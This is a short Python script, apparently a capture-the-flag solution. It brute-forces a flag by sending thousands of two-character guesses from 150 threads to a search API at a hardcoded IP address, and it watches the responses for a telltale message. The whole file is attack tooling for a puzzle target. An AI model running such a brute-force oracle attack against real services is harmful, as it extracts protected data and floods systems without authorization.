from itertools import product
import threading
import requests
import string

alphabet = string.ascii_letters + string.digits + "_{}"
print(alphabet)
wordlist = []
thread_nums = 150

# for x in product(alphabet, repeat=3):
#     wordlist += [''.join(x)]

alphabet = string.printable
for x in product(alphabet, repeat=2):
    wordlist += [''.join(x) + "}"]

res = []

def bruteforce(wordlist):
    global res
    for combo in wordlist:
        data = {"query": combo}
        resp = requests.post("http://34.134.162.213:17000/api/search", json=data)
        if "Well luckily the content of the flag is hidden so here it is" in resp.text:
            print(combo)
            res += [combo]

def main():
    threads = []
    length = len(wordlist)
    step = (length + thread_nums - 1) // thread_nums
    for i in range(thread_nums):
        start = i * step
        end = min(start + step, length)
        if start < length:
            thread = threading.Thread(target=bruteforce, args=(wordlist[start:end],))
            threads += [thread]
            thread.start()
            
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
    print(res)